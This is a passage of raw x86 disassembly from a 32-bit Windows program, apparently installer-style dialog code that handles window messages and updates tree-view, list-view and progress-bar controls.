  404981:	74 09                	je     0x40498c
  404983:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404986:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  40498a:	75 68                	jne    0x4049f4
  40498c:	33 c9                	xor    %ecx,%ecx
  40498e:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404991:	0f 95 c1             	setne  %cl
  404994:	51                   	push   %ecx
  404995:	ff 75 fc             	push   -0x4(%ebp)
  404998:	e8 9b fc ff ff       	call   0x404638
  40499d:	3b c7                	cmp    %edi,%eax
  40499f:	7c 53                	jl     0x4049f4
  4049a1:	8b c8                	mov    %eax,%ecx
  4049a3:	69 c9 18 04 00 00    	imul   $0x418,%ecx,%ecx
  4049a9:	8d 54 19 08          	lea    0x8(%ecx,%ebx,1),%edx
  4049ad:	8b 0a                	mov    (%edx),%ecx
  4049af:	f6 c1 10             	test   $0x10,%cl
  4049b2:	75 40                	jne    0x4049f4
  4049b4:	f6 c1 40             	test   $0x40,%cl
  4049b7:	74 14                	je     0x4049cd
  4049b9:	81 f1 80 00 00 00    	xor    $0x80,%ecx
  4049bf:	84 c9                	test   %cl,%cl
  4049c1:	79 05                	jns    0x4049c8
  4049c3:	83 c9 01             	or     $0x1,%ecx
  4049c6:	eb 08                	jmp    0x4049d0
  4049c8:	83 e1 fe             	and    $0xfffffffe,%ecx
  4049cb:	eb 03                	jmp    0x4049d0
  4049cd:	83 f1 01             	xor    $0x1,%ecx
  4049d0:	50                   	push   %eax
  4049d1:	89 0a                	mov    %ecx,(%edx)
  4049d3:	e8 a5 c7 ff ff       	call   0x40117d
  4049d8:	a1 30 f0 42 00       	mov    0x42f030,%eax
  4049dd:	33 c9                	xor    %ecx,%ecx
  4049df:	f7 d0                	not    %eax
  4049e1:	41                   	inc    %ecx
  4049e2:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4049e9:	c1 e8 08             	shr    $0x8,%eax
  4049ec:	23 c1                	and    %ecx,%eax
  4049ee:	89 4d 10             	mov    %ecx,0x10(%ebp)
  4049f1:	89 45 14             	mov    %eax,0x14(%ebp)
  4049f4:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  4049f7:	74 4e                	je     0x404a47
  4049f9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4049fc:	81 78 08 6e fe ff ff 	cmpl   $0xfffffe6e,0x8(%eax)
  404a03:	75 0e                	jne    0x404a13
  404a05:	ff 70 5c             	push   0x5c(%eax)
  404a08:	57                   	push   %edi
  404a09:	68 19 04 00 00       	push   $0x419
  404a0e:	ff 75 fc             	push   -0x4(%ebp)
  404a11:	ff d6                	call   *%esi
  404a13:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404a16:	81 78 08 6a fe ff ff 	cmpl   $0xfffffe6a,0x8(%eax)
  404a1d:	75 28                	jne    0x404a47
  404a1f:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  404a23:	75 12                	jne    0x404a37
  404a25:	8b 40 5c             	mov    0x5c(%eax),%eax
  404a28:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  404a2e:	8d 44 18 08          	lea    0x8(%eax,%ebx,1),%eax
  404a32:	83 08 20             	orl    $0x20,(%eax)
  404a35:	eb 10                	jmp    0x404a47
  404a37:	8b 40 5c             	mov    0x5c(%eax),%eax
  404a3a:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  404a40:	8d 5c 18 08          	lea    0x8(%eax,%ebx,1),%ebx
  404a44:	83 23 df             	andl   $0xffffffdf,(%ebx)
  404a47:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404a4e:	75 72                	jne    0x404ac2
  404a50:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  404a56:	0f 85 48 02 00 00    	jne    0x404ca4
  404a5c:	8b 45 10             	mov    0x10(%ebp),%eax
  404a5f:	c1 e8 10             	shr    $0x10,%eax
  404a62:	66 3d 01 00          	cmp    $0x1,%ax
  404a66:	0f 85 38 02 00 00    	jne    0x404ca4
  404a6c:	57                   	push   %edi
  404a6d:	57                   	push   %edi
  404a6e:	68 47 01 00 00       	push   $0x147
  404a73:	ff 75 f8             	push   -0x8(%ebp)
  404a76:	ff d6                	call   *%esi
  404a78:	83 f8 ff             	cmp    $0xffffffff,%eax
  404a7b:	0f 84 23 02 00 00    	je     0x404ca4
  404a81:	57                   	push   %edi
  404a82:	50                   	push   %eax
  404a83:	68 50 01 00 00       	push   $0x150
  404a88:	ff 75 f8             	push   -0x8(%ebp)
  404a8b:	ff d6                	call   *%esi
  404a8d:	8b d8                	mov    %eax,%ebx
  404a8f:	83 fb ff             	cmp    $0xffffffff,%ebx
  404a92:	74 08                	je     0x404a9c
  404a94:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404a97:	39 3c 98             	cmp    %edi,(%eax,%ebx,4)
  404a9a:	75 03                	jne    0x404a9f
  404a9c:	6a 20                	push   $0x20
  404a9e:	5b                   	pop    %ebx
  404a9f:	53                   	push   %ebx
  404aa0:	e8 f4 c7 ff ff       	call   0x401299
  404aa5:	53                   	push   %ebx
  404aa6:	57                   	push   %edi
  404aa7:	68 20 04 00 00       	push   $0x420
  404aac:	ff 75 08             	push   0x8(%ebp)
  404aaf:	ff d6                	call   *%esi
  404ab1:	c7 45 10 01 00 00 00 	movl   $0x1,0x10(%ebp)
  404ab8:	89 7d 14             	mov    %edi,0x14(%ebp)
  404abb:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404ac2:	81 7d 0c 00 02 00 00 	cmpl   $0x200,0xc(%ebp)
  404ac9:	75 0c                	jne    0x404ad7
  404acb:	57                   	push   %edi
  404acc:	57                   	push   %edi
  404acd:	68 00 02 00 00       	push   $0x200
  404ad2:	ff 75 fc             	push   -0x4(%ebp)
  404ad5:	ff d6                	call   *%esi
  404ad7:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404ade:	75 32                	jne    0x404b12
  404ae0:	a1 64 a4 42 00       	mov    0x42a464,%eax
  404ae5:	3b c7                	cmp    %edi,%eax
  404ae7:	74 07                	je     0x404af0
  404ae9:	50                   	push   %eax
  404aea:	ff 15 2c 70 40 00    	call   *0x40702c
  404af0:	a1 7c a4 42 00       	mov    0x42a47c,%eax
  404af5:	3b c7                	cmp    %edi,%eax
  404af7:	74 07                	je     0x404b00
  404af9:	50                   	push   %eax
  404afa:	ff 15 f4 70 40 00    	call   *0x4070f4
  404b00:	89 3d 64 a4 42 00    	mov    %edi,0x42a464
  404b06:	89 3d 7c a4 42 00    	mov    %edi,0x42a47c
  404b0c:	89 3d 80 f0 42 00    	mov    %edi,0x42f080
  404b12:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404b19:	0f 85 47 01 00 00    	jne    0x404c66
  404b1f:	57                   	push   %edi
  404b20:	57                   	push   %edi
  404b21:	e8 c9 c6 ff ff       	call   0x4011ef
  404b26:	39 7d 10             	cmp    %edi,0x10(%ebp)
  404b29:	74 07                	je     0x404b32
  404b2b:	6a 08                	push   $0x8
  404b2d:	e8 de c8 ff ff       	call   0x401410
  404b32:	39 7d 14             	cmp    %edi,0x14(%ebp)
  404b35:	74 3f                	je     0x404b76
  404b37:	ff 35 7c a4 42 00    	push   0x42a47c
  404b3d:	e8 a0 c7 ff ff       	call   0x4012e2
  404b42:	8b d8                	mov    %eax,%ebx
  404b44:	53                   	push   %ebx
  404b45:	e8 4f c7 ff ff       	call   0x401299
  404b4a:	33 c0                	xor    %eax,%eax
  404b4c:	33 c9                	xor    %ecx,%ecx
  404b4e:	3b df                	cmp    %edi,%ebx
  404b50:	7e 0e                	jle    0x404b60
  404b52:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404b55:	39 3c 82             	cmp    %edi,(%edx,%eax,4)
  404b58:	74 01                	je     0x404b5b
  404b5a:	41                   	inc    %ecx
  404b5b:	40                   	inc    %eax
  404b5c:	3b c3                	cmp    %ebx,%eax
  404b5e:	7c f2                	jl     0x404b52
  404b60:	57                   	push   %edi
  404b61:	51                   	push   %ecx
  404b62:	68 4e 01 00 00       	push   $0x14e
  404b67:	ff 75 f8             	push   -0x8(%ebp)
  404b6a:	ff d6                	call   *%esi
  404b6c:	89 5d 14             	mov    %ebx,0x14(%ebp)
  404b6f:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  404b76:	57                   	push   %edi
  404b77:	57                   	push   %edi
  404b78:	e8 72 c6 ff ff       	call   0x4011ef
  404b7d:	a1 7c a4 42 00       	mov    0x42a47c,%eax
  404b82:	39 3d 4c f0 42 00    	cmp    %edi,0x42f04c
  404b88:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404b8b:	a1 48 f0 42 00       	mov    0x42f048,%eax
  404b90:	c7 45 c8 30 f0 00 00 	movl   $0xf030,-0x38(%ebp)
  404b97:	89 7d f4             	mov    %edi,-0xc(%ebp)
  404b9a:	0f 8e 9c 00 00 00    	jle    0x404c3c
  404ba0:	8d 58 08             	lea    0x8(%eax),%ebx
  404ba3:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404ba6:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404ba9:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  404bac:	3b c7                	cmp    %edi,%eax
  404bae:	74 74                	je     0x404c24
  404bb0:	8b 0b                	mov    (%ebx),%ecx
  404bb2:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404bb5:	f6 c5 01             	test   $0x1,%ch
  404bb8:	c7 45 bc 08 00 00 00 	movl   $0x8,-0x44(%ebp)
  404bbf:	74 11                	je     0x404bd2
  404bc1:	8d 43 10             	lea    0x10(%ebx),%eax
  404bc4:	c7 45 bc 09 00 00 00 	movl   $0x9,-0x44(%ebp)
  404bcb:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404bce:	80 63 01 fe          	andb   $0xfe,0x1(%ebx)
  404bd2:	f6 c1 40             	test   $0x40,%cl
  404bd5:	74 05                	je     0x404bdc
  404bd7:	6a 03                	push   $0x3
  404bd9:	58                   	pop    %eax
  404bda:	eb 0e                	jmp    0x404bea
  404bdc:	8b c1                	mov    %ecx,%eax
  404bde:	83 e0 01             	and    $0x1,%eax
  404be1:	40                   	inc    %eax
  404be2:	f6 c1 10             	test   $0x10,%cl
  404be5:	74 03                	je     0x404bea
  404be7:	83 c0 03             	add    $0x3,%eax
  404bea:	8b d1                	mov    %ecx,%edx
  404bec:	ff 75 c0             	push   -0x40(%ebp)
  404bef:	c1 e0 0b             	shl    $0xb,%eax
  404bf2:	83 e2 08             	and    $0x8,%edx
  404bf5:	0b c2                	or     %edx,%eax
  404bf7:	8b d1                	mov    %ecx,%edx
  404bf9:	c1 f9 05             	sar    $0x5,%ecx
  404bfc:	03 c0                	add    %eax,%eax
  404bfe:	83 e2 20             	and    $0x20,%edx
  404c01:	83 e1 01             	and    $0x1,%ecx
  404c04:	0b c2                	or     %edx,%eax
  404c06:	41                   	inc    %ecx
  404c07:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  404c0a:	51                   	push   %ecx
  404c0b:	68 02 11 00 00       	push   $0x1102
  404c10:	ff 75 fc             	push   -0x4(%ebp)
  404c13:	ff d6                	call   *%esi
  404c15:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404c18:	50                   	push   %eax
  404c19:	57                   	push   %edi
  404c1a:	68 0d 11 00 00       	push   $0x110d
  404c1f:	ff 75 fc             	push   -0x4(%ebp)
  404c22:	ff d6                	call   *%esi
  404c24:	ff 45 f4             	incl   -0xc(%ebp)
  404c27:	81 c3 18 04 00 00    	add    $0x418,%ebx
  404c2d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404c30:	3b 05 4c f0 42 00    	cmp    0x42f04c,%eax
  404c36:	0f 8c 67 ff ff ff    	jl     0x404ba3
  404c3c:	6a 01                	push   $0x1
  404c3e:	57                   	push   %edi
  404c3f:	ff 75 fc             	push   -0x4(%ebp)
  404c42:	ff 15 34 72 40 00    	call   *0x407234
  404c48:	a1 fc e7 42 00       	mov    0x42e7fc,%eax
  404c4d:	39 78 10             	cmp    %edi,0x10(%eax)
  404c50:	74 14                	je     0x404c66
  404c52:	6a 05                	push   $0x5
  404c54:	e8 b2 f9 ff ff       	call   0x40460b
  404c59:	50                   	push   %eax
  404c5a:	6a fb                	push   $0xfffffffb
  404c5c:	68 ff 03 00 00       	push   $0x3ff
  404c61:	e8 f0 f8 ff ff       	call   0x404556
  404c66:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  404c6d:	75 35                	jne    0x404ca4
  404c6f:	f6 05 31 f0 42 00 01 	testb  $0x1,0x42f031
  404c76:	74 2c                	je     0x404ca4
  404c78:	33 c0                	xor    %eax,%eax
  404c7a:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  404c7e:	8b 35 f4 71 40 00    	mov    0x4071f4,%esi
  404c84:	0f 94 c0             	sete   %al
  404c87:	c1 e0 03             	shl    $0x3,%eax
  404c8a:	8b f8                	mov    %eax,%edi
  404c8c:	57                   	push   %edi
  404c8d:	ff 75 fc             	push   -0x4(%ebp)
  404c90:	ff d6                	call   *%esi
  404c92:	57                   	push   %edi
  404c93:	68 fe 03 00 00       	push   $0x3fe
  404c98:	ff 75 08             	push   0x8(%ebp)
  404c9b:	ff 15 20 72 40 00    	call   *0x407220
  404ca1:	50                   	push   %eax
  404ca2:	ff d6                	call   *%esi
  404ca4:	ff 75 14             	push   0x14(%ebp)
  404ca7:	ff 75 10             	push   0x10(%ebp)
  404caa:	ff 75 0c             	push   0xc(%ebp)
  404cad:	e8 64 f1 ff ff       	call   0x403e16
  404cb2:	5f                   	pop    %edi
  404cb3:	5e                   	pop    %esi
  404cb4:	5b                   	pop    %ebx
  404cb5:	c9                   	leave
  404cb6:	c2 10 00             	ret    $0x10
  404cb9:	55                   	push   %ebp
  404cba:	8b ec                	mov    %esp,%ebp
  404cbc:	81 7d 0c 02 01 00 00 	cmpl   $0x102,0xc(%ebp)
  404cc3:	53                   	push   %ebx
  404cc4:	56                   	push   %esi
  404cc5:	75 17                	jne    0x404cde
  404cc7:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  404ccb:	75 7d                	jne    0x404d4a
  404ccd:	68 13 04 00 00       	push   $0x413
  404cd2:	e8 24 f1 ff ff       	call   0x403dfb
  404cd7:	33 c0                	xor    %eax,%eax
  404cd9:	e9 85 00 00 00       	jmp    0x404d63
  404cde:	81 7d 0c 00 02 00 00 	cmpl   $0x200,0xc(%ebp)
  404ce5:	be 19 04 00 00       	mov    $0x419,%esi
  404cea:	75 1e                	jne    0x404d0a
  404cec:	ff 75 08             	push   0x8(%ebp)
  404cef:	ff 15 a0 71 40 00    	call   *0x4071a0
  404cf5:	85 c0                	test   %eax,%eax
  404cf7:	74 51                	je     0x404d4a
  404cf9:	6a 01                	push   $0x1
  404cfb:	ff 75 08             	push   0x8(%ebp)
  404cfe:	e8 35 f9 ff ff       	call   0x404638
  404d03:	8b d8                	mov    %eax,%ebx
  404d05:	89 75 0c             	mov    %esi,0xc(%ebp)
  404d08:	eb 03                	jmp    0x404d0d
  404d0a:	8b 5d 14             	mov    0x14(%ebp),%ebx
  404d0d:	39 75 0c             	cmp    %esi,0xc(%ebp)
  404d10:	75 3b                	jne    0x404d4d
  404d12:	39 1d 70 a4 42 00    	cmp    %ebx,0x42a470
  404d18:	74 33                	je     0x404d4d
  404d1a:	57                   	push   %edi
  404d1b:	be 00 00 43 00       	mov    $0x430000,%esi
  404d20:	bf 88 a4 42 00       	mov    $0x42a488,%edi
  404d25:	56                   	push   %esi
  404d26:	57                   	push   %edi
  404d27:	89 1d 70 a4 42 00    	mov    %ebx,0x42a470
  404d2d:	e8 72 0c 00 00       	call   0x4059a4
  404d32:	53                   	push   %ebx
  404d33:	56                   	push   %esi
  404d34:	e8 c9 0b 00 00       	call   0x405902
  404d39:	6a 06                	push   $0x6
  404d3b:	e8 d0 c6 ff ff       	call   0x401410
  404d40:	57                   	push   %edi
  404d41:	56                   	push   %esi
  404d42:	e8 5d 0c 00 00       	call   0x4059a4
  404d47:	5f                   	pop    %edi
  404d48:	eb 03                	jmp    0x404d4d
  404d4a:	8b 5d 14             	mov    0x14(%ebp),%ebx
  404d4d:	53                   	push   %ebx
  404d4e:	ff 75 10             	push   0x10(%ebp)
  404d51:	ff 75 0c             	push   0xc(%ebp)
  404d54:	ff 75 08             	push   0x8(%ebp)
  404d57:	ff 35 78 a4 42 00    	push   0x42a478
  404d5d:	ff 15 9c 71 40 00    	call   *0x40719c
  404d63:	5e                   	pop    %esi
  404d64:	5b                   	pop    %ebx
  404d65:	5d                   	pop    %ebp
  404d66:	c2 10 00             	ret    $0x10
  404d69:	55                   	push   %ebp
  404d6a:	8b ec                	mov    %esp,%ebp
  404d6c:	83 ec 30             	sub    $0x30,%esp
  404d6f:	a1 04 e8 42 00       	mov    0x42e804,%eax
  404d74:	53                   	push   %ebx
  404d75:	33 db                	xor    %ebx,%ebx
  404d77:	56                   	push   %esi
  404d78:	3b c3                	cmp    %ebx,%eax
  404d7a:	57                   	push   %edi
  404d7b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404d7e:	0f 84 b0 00 00 00    	je     0x404e34
  404d84:	a1 8c 92 40 00       	mov    0x40928c,%eax
  404d89:	be 60 9c 42 00       	mov    $0x429c60,%esi
  404d8e:	8b f8                	mov    %eax,%edi
  404d90:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404d93:	83 e7 01             	and    $0x1,%edi
  404d96:	75 09                	jne    0x404da1
  404d98:	ff 75 08             	push   0x8(%ebp)
  404d9b:	56                   	push   %esi
  404d9c:	e8 25 0c 00 00       	call   0x4059c6
  404da1:	56                   	push   %esi
  404da2:	e8 13 0c 00 00       	call   0x4059ba
  404da7:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  404daa:	89 45 08             	mov    %eax,0x8(%ebp)
  404dad:	74 1b                	je     0x404dca
  404daf:	ff 75 0c             	push   0xc(%ebp)
  404db2:	e8 03 0c 00 00       	call   0x4059ba
  404db7:	03 45 08             	add    0x8(%ebp),%eax
  404dba:	3d 00 08 00 00       	cmp    $0x800,%eax
  404dbf:	73 73                	jae    0x404e34
  404dc1:	ff 75 0c             	push   0xc(%ebp)
  404dc4:	56                   	push   %esi
  404dc5:	e8 f6 0b 00 00       	call   0x4059c0
  404dca:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  404dce:	74 0d                	je     0x404ddd
  404dd0:	56                   	push   %esi
  404dd1:	ff 35 e8 e7 42 00    	push   0x42e7e8
  404dd7:	ff 15 e8 71 40 00    	call   *0x4071e8
  404ddd:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  404de1:	74 44                	je     0x404e27
  404de3:	53                   	push   %ebx
  404de4:	53                   	push   %ebx
  404de5:	68 04 10 00 00       	push   $0x1004
  404dea:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  404ded:	ff 75 fc             	push   -0x4(%ebp)
  404df0:	8b 35 38 72 40 00    	mov    0x407238,%esi
  404df6:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  404dfd:	ff d6                	call   *%esi
  404dff:	2b c7                	sub    %edi,%eax
  404e01:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  404e04:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404e07:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404e0a:	50                   	push   %eax
  404e0b:	b8 07 10 00 00       	mov    $0x1007,%eax
  404e10:	2b c7                	sub    %edi,%eax
  404e12:	53                   	push   %ebx
  404e13:	50                   	push   %eax
  404e14:	ff 75 fc             	push   -0x4(%ebp)
  404e17:	ff d6                	call   *%esi
  404e19:	53                   	push   %ebx
  404e1a:	ff 75 d4             	push   -0x2c(%ebp)
  404e1d:	68 13 10 00 00       	push   $0x1013
  404e22:	ff 75 fc             	push   -0x4(%ebp)
  404e25:	ff d6                	call   *%esi
  404e27:	3b fb                	cmp    %ebx,%edi
  404e29:	74 09                	je     0x404e34
  404e2b:	8b 45 08             	mov    0x8(%ebp),%eax
  404e2e:	88 98 60 9c 42 00    	mov    %bl,0x429c60(%eax)
  404e34:	5f                   	pop    %edi
  404e35:	5e                   	pop    %esi
  404e36:	5b                   	pop    %ebx
  404e37:	c9                   	leave
  404e38:	c2 08 00             	ret    $0x8
  404e3b:	56                   	push   %esi
  404e3c:	8b 35 48 f0 42 00    	mov    0x42f048,%esi
  404e42:	57                   	push   %edi
  404e43:	8b 3d 4c f0 42 00    	mov    0x42f04c,%edi
  404e49:	6a 00                	push   $0x0
  404e4b:	ff 15 70 72 40 00    	call   *0x407270
  404e51:	09 05 d0 f0 42 00    	or     %eax,0x42f0d0
  404e57:	6a 00                	push   $0x0
  404e59:	e8 9d ef ff ff       	call   0x403dfb
  404e5e:	85 ff                	test   %edi,%edi
  404e60:	74 2b                	je     0x404e8d
  404e62:	83 c6 0c             	add    $0xc,%esi
  404e65:	4f                   	dec    %edi
  404e66:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  404e6a:	74 0f                	je     0x404e7b
  404e6c:	ff 74 24 0c          	push   0xc(%esp)
  404e70:	ff 36                	push   (%esi)
  404e72:	e8 f6 c4 ff ff       	call   0x40136d
  404e77:	85 c0                	test   %eax,%eax
  404e79:	75 0c                	jne    0x404e87
  404e7b:	81 c6 18 04 00 00    	add    $0x418,%esi
  404e81:	85 ff                	test   %edi,%edi
  404e83:	75 e0                	jne    0x404e65
  404e85:	eb 06                	jmp    0x404e8d
  404e87:	ff 05 ac f0 42 00    	incl   0x42f0ac
  404e8d:	68 04 04 00 00       	push   $0x404
  404e92:	e8 64 ef ff ff       	call   0x403dfb
  404e97:	ff 15 74 72 40 00    	call   *0x407274
  404e9d:	a1 ac f0 42 00       	mov    0x42f0ac,%eax
  404ea2:	5f                   	pop    %edi
  404ea3:	5e                   	pop    %esi
  404ea4:	c2 04 00             	ret    $0x4
  404ea7:	55                   	push   %ebp
  404ea8:	8b ec                	mov    %esp,%ebp
  404eaa:	83 ec 3c             	sub    $0x3c,%esp
  404ead:	a1 04 e8 42 00       	mov    0x42e804,%eax
  404eb2:	53                   	push   %ebx
  404eb3:	56                   	push   %esi
  404eb4:	57                   	push   %edi
  404eb5:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404eb8:	33 db                	xor    %ebx,%ebx
  404eba:	81 ff 10 01 00 00    	cmp    $0x110,%edi
  404ec0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404ec3:	0f 85 80 01 00 00    	jne    0x405049
  404ec9:	83 4d d4 ff          	orl    $0xffffffff,-0x2c(%ebp)
  404ecd:	83 4d e0 ff          	orl    $0xffffffff,-0x20(%ebp)
  404ed1:	33 c0                	xor    %eax,%eax
  404ed3:	8d 7d e4             	lea    -0x1c(%ebp),%edi
  404ed6:	c7 45 cc 02 00 00 00 	movl   $0x2,-0x34(%ebp)
  404edd:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  404ee0:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  404ee3:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  404ee6:	ab                   	stos   %eax,%es:(%edi)
  404ee7:	ab                   	stos   %eax,%es:(%edi)
  404ee8:	a1 28 f0 42 00       	mov    0x42f028,%eax
  404eed:	8b 3d 20 72 40 00    	mov    0x407220,%edi
  404ef3:	68 03 04 00 00       	push   $0x403
  404ef8:	8b 48 5c             	mov    0x5c(%eax),%ecx
  404efb:	8b 40 60             	mov    0x60(%eax),%eax
  404efe:	ff 75 08             	push   0x8(%ebp)
  404f01:	89 4d 10             	mov    %ecx,0x10(%ebp)
  404f04:	89 45 0c             	mov    %eax,0xc(%ebp)
  404f07:	ff d7                	call   *%edi
  404f09:	68 ee 03 00 00       	push   $0x3ee
  404f0e:	a3 f0 e7 42 00       	mov    %eax,0x42e7f0
  404f13:	ff 75 08             	push   0x8(%ebp)
  404f16:	ff d7                	call   *%edi
  404f18:	68 f8 03 00 00       	push   $0x3f8
  404f1d:	a3 e8 e7 42 00       	mov    %eax,0x42e7e8
  404f22:	ff 75 08             	push   0x8(%ebp)
  404f25:	ff d7                	call   *%edi
  404f27:	ff 35 f0 e7 42 00    	push   0x42e7f0
  404f2d:	a3 04 e8 42 00       	mov    %eax,0x42e804
  404f32:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404f35:	e8 aa ee ff ff       	call   0x403de4
  404f3a:	6a 04                	push   $0x4
  404f3c:	e8 ca f6 ff ff       	call   0x40460b
  404f41:	a3 f4 e7 42 00       	mov    %eax,0x42e7f4
  404f46:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404f49:	50                   	push   %eax
  404f4a:	89 1d 0c e8 42 00    	mov    %ebx,0x42e80c
  404f50:	ff 75 fc             	push   -0x4(%ebp)
  404f53:	ff 15 44 72 40 00    	call   *0x407244
  404f59:	6a 15                	push   $0x15
  404f5b:	ff 15 c0 71 40 00    	call   *0x4071c0
  404f61:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404f64:	8b 35 38 72 40 00    	mov    0x407238,%esi
  404f6a:	2b c8                	sub    %eax,%ecx
  404f6c:	8d 45 cc             	lea    -0x34(%ebp),%eax
  404f6f:	50                   	push   %eax
  404f70:	53                   	push   %ebx
  404f71:	68 1b 10 00 00       	push   $0x101b
  404f76:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  404f79:	ff 75 fc             	push   -0x4(%ebp)
  404f7c:	ff d6                	call   *%esi
  404f7e:	b8 00 40 00 00       	mov    $0x4000,%eax
  404f83:	50                   	push   %eax
  404f84:	50                   	push   %eax
  404f85:	68 36 10 00 00       	push   $0x1036
  404f8a:	ff 75 fc             	push   -0x4(%ebp)
  404f8d:	ff d6                	call   *%esi
  404f8f:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  404f92:	7c 1c                	jl     0x404fb0
  404f94:	ff 75 10             	push   0x10(%ebp)
  404f97:	53                   	push   %ebx
  404f98:	68 01 10 00 00       	push   $0x1001
  404f9d:	ff 75 fc             	push   -0x4(%ebp)
  404fa0:	ff d6                	call   *%esi
  404fa2:	ff 75 10             	push   0x10(%ebp)
  404fa5:	53                   	push   %ebx
  404fa6:	68 26 10 00 00       	push   $0x1026
  404fab:	ff 75 fc             	push   -0x4(%ebp)
  404fae:	ff d6                	call   *%esi
  404fb0:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  404fb3:	7c 0e                	jl     0x404fc3
  404fb5:	ff 75 0c             	push   0xc(%ebp)
  404fb8:	53                   	push   %ebx
  404fb9:	68 24 10 00 00       	push   $0x1024
  404fbe:	ff 75 fc             	push   -0x4(%ebp)
  404fc1:	ff d6                	call   *%esi
  404fc3:	8b 45 14             	mov    0x14(%ebp),%eax
  404fc6:	ff 70 30             	push   0x30(%eax)
  404fc9:	6a 1b                	push   $0x1b
  404fcb:	ff 75 08             	push   0x8(%ebp)
  404fce:	e8 dc ed ff ff       	call   0x403daf
  404fd3:	f6 05 30 f0 42 00 03 	testb  $0x3,0x42f030
  404fda:	74 29                	je     0x405005
  404fdc:	53                   	push   %ebx
  404fdd:	ff 35 f0 e7 42 00    	push   0x42e7f0
  404fe3:	ff 15 f4 71 40 00    	call   *0x4071f4
  404fe9:	f6 05 30 f0 42 00 02 	testb  $0x2,0x42f030
  404ff0:	75 0d                	jne    0x404fff
  404ff2:	6a 08                	push   $0x8
  404ff4:	ff 75 fc             	push   -0x4(%ebp)
  404ff7:	ff 15 f4 71 40 00    	call   *0x4071f4
  404ffd:	eb 06                	jmp    0x405005
  404fff:	89 1d f0 e7 42 00    	mov    %ebx,0x42e7f0
  405005:	68 ec 03 00 00       	push   $0x3ec
  40500a:	ff 75 08             	push   0x8(%ebp)
  40500d:	ff d7                	call   *%edi
  40500f:	68 00 00 30 75       	push   $0x75300000
  405014:	8b f8                	mov    %eax,%edi
  405016:	53                   	push   %ebx
  405017:	68 01 04 00 00       	push   $0x401
  40501c:	57                   	push   %edi
  40501d:	ff d6                	call   *%esi
  40501f:	f6 05 30 f0 42 00 04 	testb  $0x4,0x42f030
  405026:	0f 84 ef 01 00 00    	je     0x40521b
  40502c:	ff 75 0c             	push   0xc(%ebp)
  40502f:	53                   	push   %ebx
  405030:	68 09 04 00 00       	push   $0x409
  405035:	57                   	push   %edi
  405036:	ff d6                	call   *%esi
  405038:	ff 75 10             	push   0x10(%ebp)
  40503b:	53                   	push   %ebx
  40503c:	68 01 20 00 00       	push   $0x2001
  405041:	57                   	push   %edi
  405042:	ff d6                	call   *%esi
  405044:	e9 d2 01 00 00       	jmp    0x40521b
  405049:	81 ff 05 04 00 00    	cmp    $0x405,%edi
  40504f:	75 28                	jne    0x405079
  405051:	8d 45 0c             	lea    0xc(%ebp),%eax
  405054:	50                   	push   %eax
  405055:	53                   	push   %ebx
  405056:	68 ec 03 00 00       	push   $0x3ec
  40505b:	ff 75 08             	push   0x8(%ebp)
  40505e:	ff 15 20 72 40 00    	call   *0x407220
  405064:	50                   	push   %eax
  405065:	68 3b 4e 40 00       	push   $0x404e3b
  40506a:	53                   	push   %ebx
  40506b:	53                   	push   %ebx
  40506c:	ff 15 c8 70 40 00    	call   *0x4070c8
  405072:	50                   	push   %eax
  405073:	ff 15 a4 70 40 00    	call   *0x4070a4
  405079:	8b 35 f4 71 40 00    	mov    0x4071f4,%esi
  40507f:	81 ff 11 01 00 00    	cmp    $0x111,%edi
  405085:	75 1d                	jne    0x4050a4
  405087:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  40508d:	75 36                	jne    0x4050c5
  40508f:	53                   	push   %ebx
